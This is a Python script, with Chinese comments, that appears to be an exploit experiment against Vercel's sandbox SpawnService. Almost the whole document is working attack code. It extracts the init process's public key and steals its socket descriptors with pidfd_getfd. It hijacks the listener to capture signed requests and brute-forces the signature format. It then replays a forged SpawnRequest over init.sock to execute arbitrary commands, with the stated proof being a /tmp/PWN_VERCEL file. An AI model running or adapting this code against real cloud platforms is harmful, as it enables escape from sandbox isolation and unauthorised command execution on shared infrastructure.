# 实验J136: SpawnService 签名协议逆向 — pubkey提取 + accept劫持捕获 + 验签格式爆破 + 重放攻击验证
# 动机: j10 内存证据 path+ts 紧贴拼接(Spawn1787132361); j110b 捕获完整签名请求
# 目标: 确认 X-Signature 的消息格式; 若不含 body -> 用捕获的(path,ts,sig)重放恶意 SpawnRequest -> 任意命令执行
# 零破坏: 恶意命令仅写 /tmp/PWN_VERCEL 证明执行; 沙箱用完即删
import json, time, urllib.request, urllib.error, sys, threading
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj136"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import os, socket, ctypes, time, threading, json, base64, subprocess, struct, sys
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

libc = ctypes.CDLL(None, use_errno=True)
libc.syscall.restype = ctypes.c_long
libc.getsockopt.restype = ctypes.c_int

def sc(nr, *args):
    ctypes.set_errno(0)
    r = libc.syscall(nr, *args)
    return r, ctypes.get_errno()

# [0] openssl ed25519 验签自检 (确保流程可用)
os.makedirs("/root", exist_ok=True)
subprocess.run(["openssl", "genpkey", "-algorithm", "ED25519", "-out", "/root/t.key"],
               capture_output=True)
subprocess.run(["openssl", "pkey", "-in", "/root/t.key", "-pubout", "-out", "/root/t.pub"],
               capture_output=True)
open("/root/tm.bin", "wb").write(b"selftest-message")
subprocess.run(["openssl", "pkeyutl", "-sign", "-inkey", "/root/t.key", "-rawin",
                "-in", "/root/tm.bin", "-out", "/root/ts.bin"], capture_output=True)
sr = subprocess.run(["openssl", "pkeyutl", "-verify", "-pubin", "-inkey", "/root/t.pub",
                     "-rawin", "-in", "/root/tm.bin", "-sigfile", "/root/ts.bin"],
                    capture_output=True)
print("SELFTEST_VERIFY_RC:", sr.returncode, flush=True)

# [1] 提取 pubkey
pub = None
for a in open("/proc/1/cmdline", "rb").read().split(b"\x00"):
    if a.startswith(b"--pubkey="):
        pub = a[len(b"--pubkey="):]
print("PUBKEY_RAW:", pub.decode() if pub else "NONE", flush=True)
if pub:
    raw = base64.b64decode(pub)
    der = bytes.fromhex("302a300506032b6570032100") + raw
    pem = (b"-----BEGIN PUBLIC KEY-----\n" + base64.b64encode(der) +
           b"\n-----END PUBLIC KEY-----\n")
    open("/root/pub.pem", "wb").write(pem)
    print("PUBKEY_OK len=%d" % len(raw), flush=True)

# [2] 枚举 fd, 复制 socket, 识别 listener (SO_ACCEPTCONN=30)
fdmap = {}
for fd in sorted(os.listdir("/proc/1/fd"), key=int):
    try:
        fdmap[int(fd)] = os.readlink("/proc/1/fd/" + fd)
    except Exception:
        pass
print("FDMAP:", json.dumps(fdmap), flush=True)

pfd, e = sc(434, 1, 0)  # pidfd_open(1)
print("PIDFD:", pfd, e, flush=True)

listener_nfd = None
conn_nfds = []
if pfd >= 0:
    for fd, ln in fdmap.items():
        if "socket:" not in ln:
            continue
        nfd, e2 = sc(438, pfd, fd, 0)
        if nfd < 0:
            print("COPY_FAIL fd=%d err=%d" % (fd, e2), flush=True)
            continue
        v = ctypes.c_int(0)
        l = ctypes.c_int(4)
        r = libc.getsockopt(nfd, 1, 30, ctypes.byref(v), ctypes.byref(l))
        if r == 0 and v.value == 1:
            listener_nfd = nfd
            print("LISTENER fd=%d nfd=%d" % (fd, nfd), flush=True)
        else:
            conn_nfds.append(nfd)
            try:
                os.set_blocking(nfd, False)
            except OSError:
                pass

captured = []
stop = threading.Event()
verified_fmt = [None]

def verify(msg, sig):
    open("/root/m.bin", "wb").write(msg)
    open("/root/s.bin", "wb").write(sig)
    r = subprocess.run(["openssl", "pkeyutl", "-verify", "-pubin", "-inkey",
                        "/root/pub.pem", "-rawin", "-in", "/root/m.bin",
                        "-sigfile", "/root/s.bin"], capture_output=True, timeout=15)
    return r.returncode == 0

def sfield(f, v):
    b = v.encode() if isinstance(v, str) else v
    out = bytearray()
    tag = (f << 3) | 2
    while tag > 0x7f:
        out.append((tag & 0x7f) | 0x80)
        tag >>= 7
    out.append(tag)
    ln = len(b)
    while ln > 0x7f:
        out.append((ln & 0x7f) | 0x80)
        ln >>= 7
    out.append(len(b))
    return bytes(out) + b

def attack(path, ts, sigb):
    # 恶意 SpawnRequest: python3 -c 写 /tmp/PWN_VERCEL (零破坏)
    code = "import os;open('/tmp/PWN_VERCEL','w').write('PWNED uid=%d euid=%d'%(os.getuid(),os.geteuid()))"
    proto = (sfield(1, "python3") + sfield(2, "-c") + sfield(2, code) +
             sfield(4, "/vercel/sandbox"))
    env_body = b"\x00" + struct.pack(">I", len(proto)) + proto
    payload = (b"POST " + path.encode() + b" HTTP/1.1\r\n"
               b"Host: localhost\r\n"
               b"Content-Type: application/connect+proto\r\n"
               b"Connect-Protocol-Version: 1\r\n"
               b"X-Signature: " + sigb.encode() + b"\r\n"
               b"X-Timestamp: " + ts.encode() + b"\r\n"
               b"Content-Length: " + str(len(env_body)).encode() + b"\r\n"
               b"\r\n" + env_body)
    print("ATTACK proto_len=%d body_len=%d" % (len(proto), len(env_body)), flush=True)
    for attempt in range(3):
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(6)
            s.connect("/run/vercel/share/init.sock")
            s.sendall(payload)
            resp = b""
            try:
                while True:
                    c = s.recv(65536)
                    if not c:
                        break
                    resp += c
            except socket.timeout:
                pass
            s.close()
            print("ATTACK_RESP_%d len=%d: %r" % (attempt, len(resp), resp[:160]), flush=True)
        except Exception as ex:
            print("ATTACK_EXC %d: %r" % (attempt, ex), flush=True)
        time.sleep(1)

def process(t, req):
    try:
        head, _, body = req.partition(b"\r\n\r\n")
        lines = head.decode("latin1").split("\r\n")
        parts = lines[0].split(" ")
        if len(parts) < 2:
            return
        method, path = parts[0], parts[1]
        hs = {}
        for l in lines[1:]:
            if ":" in l:
                k, v = l.split(":", 1)
                hs[k.strip().lower()] = v.strip()
        sigb = hs.get("x-signature")
        ts = hs.get("x-timestamp")
        if not sigb or not ts:
            print("REQ ts=%s path=%s NO_SIG" % (ts, path), flush=True)
            return
        sig = base64.b64decode(sigb)
        pbody = body
        if len(body) >= 5 and struct.unpack(">I", body[1:5])[0] == len(body) - 5:
            pbody = body[5:]
        print("REQ %s %s ts=%s body=%d pbody=%d" % (method, path, ts, len(body), len(pbody)), flush=True)
        p = path.encode()
        t = ts.encode()
        cands = {
            "path+ts": p + t,
            "path+ts+body": p + t + body,
            "path+ts+pbody": p + t + pbody,
            "path+body+ts": p + body + t,
            "path+pbody+ts": p + pbody + t,
            "ts+path": t + p,
            "method+path+ts": method.encode() + p + t,
            "path+ts+len": p + t + str(len(pbody)).encode(),
        }
        for name, m in cands.items():
            if verify(m, sig):
                print(">>> VERIFY_OK fmt=%s ts=%s path=%s" % (name, ts, path), flush=True)
                if verified_fmt[0] is None:
                    verified_fmt[0] = name
                if name in ("path+ts", "ts+path", "method+path+ts"):
                    print(">>> ATTACKING (signature excludes body)", flush=True)
                    attack(path, ts, sigb)
                return
        print("NO_MATCH ts=%s body=%d" % (ts, len(body)), flush=True)
    except Exception as ex:
        print("PROC_ERR: %r" % (ex,), flush=True)

# [3] accept 劫持循环
if listener_nfd is None:
    print("NO_LISTENER", flush=True)
else:
    srv = socket.fromfd(listener_nfd, socket.AF_UNIX, socket.SOCK_STREAM)
    srv.settimeout(0.8)

    def accept_loop():
        while not stop.is_set():
            try:
                conn, _ = srv.accept()
                conn.settimeout(4)
                data = b""
                while True:
                    try:
                        c = conn.recv(65536)
                    except socket.timeout:
                        break
                    if not c:
                        break
                    data += c
                    if len(data) > 262144:
                        break
                if data:
                    captured.append((time.time(), data))
                    print("CAP len=%d" % len(data), flush=True)
                conn.close()
            except socket.timeout:
                continue
            except OSError as ex:
                print("ACCEPT_ERR: %r" % (ex,), flush=True)
                time.sleep(0.3)

    threading.Thread(target=accept_loop, daemon=True).start()

    def read_loop(nfd):
        while not stop.is_set():
            try:
                d = os.read(nfd, 65536)
                if d:
                    captured.append((time.time(), d))
                    print("RD_CAP len=%d" % len(d), flush=True)
            except BlockingIOError:
                time.sleep(0.05)
            except OSError:
                break

    for nfd in conn_nfds:
        threading.Thread(target=read_loop, args=(nfd,), daemon=True).start()

    print("READY", flush=True)
    deadline = time.time() + 65
    while time.time() < deadline:
        while captured:
            t, req = captured.pop(0)
            process(t, req)
        time.sleep(0.2)
    stop.set()
    time.sleep(0.5)
    print("CAPTURED_TOTAL=%d VERIFIED_FMT=%s" % (len(captured), verified_fmt[0]), flush=True)
    if os.path.exists("/tmp/PWN_VERCEL"):
        print("PWN_FILE:", open("/tmp/PWN_VERCEL").read(), flush=True)

print("DONE", flush=True)
"""

print(">> 启动沙箱内捕获(65s), 本地高频触发 cmd 制造签名流量", flush=True)
t0 = time.time()

def trigger():
    time.sleep(6)  # 等 PROBE 就绪
    for i in range(55):
        try:
            body = {"command": "echo", "args": ["t%d" % i], "wait": True, "logs": True, "timeout": 100}
            c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
            print(f"  trigger[{i}] -> {c}", flush=True)
        except Exception as ex:
            print(f"  trigger[{i}] EXC {ex}", flush=True)
        time.sleep(1.2)

th = threading.Thread(target=trigger, daemon=True)
th.start()
run_cmd(sid, PROBE, "sig-recon", wait=True, timeout=300000)
th.join(timeout=1)

# 验证 PWN 文件
c2, r2 = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
             {"command": "cat", "args": ["/tmp/PWN_VERCEL"], "wait": True, "logs": True, "timeout": 60})
print(f"=== verify-pwn status {c2} ===", flush=True)
print(r2[:800], flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done, elapsed=%.0fs" % (time.time() - t0), flush=True)
